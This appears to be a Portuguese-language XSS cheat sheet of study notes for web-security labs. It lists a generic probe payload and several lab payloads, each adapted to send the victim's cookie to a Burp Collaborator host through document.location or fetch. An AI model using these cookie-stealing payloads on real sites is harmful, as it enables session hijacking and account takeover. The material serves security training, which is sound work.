# XSS - Cross-Site Scripting

Se você ver um campo de busca (search) ou um seção de comentários, busque por XSS.

Se tudo estiver sendo encodado, provavelmente o parâmetro não está vulnerável a XSS.

Payload genérico para XSS:
```
<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
```

<br>

Encontrou XSS?

Adapte o payload para roubar o cookie da vítima, por exemplo:

Em vez:
```
<script>alert(1)</script>
```

Teste com:
```
<script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```

> [!TIP]
> Pratice essa adaptação de payload nos labs. Se o cookie estiver com a flag HTTPOnly ativada, o payload com `document.cookie` não vai funcionar. Remova esse trecho e teste enviando uma request qualquer para o Collaborator para ver se a estrutura está correta.

<br>

## Laboratórios

**DOM XSS in document.write sink using source location.search inside a select element**
```
storeId=test"></select><script>alert(1)</script>
```

Adapted version:
```
"></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```

<br>

**DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**
```
{{constructor.constructor('alert(1)')()}}

OU

{{$on.constructor('alert(1)')()}}
```

Adapted version:
```
{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
```

<br>

**Reflected DOM XSS**
```
\"-alert()}//
```

Adapted version:
```
\"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
```
